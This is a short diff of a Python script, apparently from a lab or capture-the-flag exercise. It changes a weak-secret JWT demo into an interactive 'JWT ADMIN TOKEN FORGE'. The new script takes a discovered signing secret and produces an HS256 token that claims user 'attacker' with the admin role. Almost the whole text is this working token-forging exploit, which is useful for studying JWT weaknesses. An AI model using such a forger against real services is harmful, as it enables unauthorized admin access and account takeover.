@@ -1,13 +1,16 @@
 import jwt
 import time
 
-WEAK_SECRET = "secret"
+print("=== JWT ADMIN TOKEN FORGE ===")
+
+secret = input("Enter discovered JWT secret: ").strip()
 
 payload = {
-    "user": "user",
+    "user": "attacker",
     "role": "admin",
     "exp": int(time.time()) + 1800
 }
 
-token = jwt.encode(payload, WEAK_SECRET, algorithm="HS256")
+token = jwt.encode(payload, secret, algorithm="HS256")
+print("\nForged ADMIN token:")
 print(token)
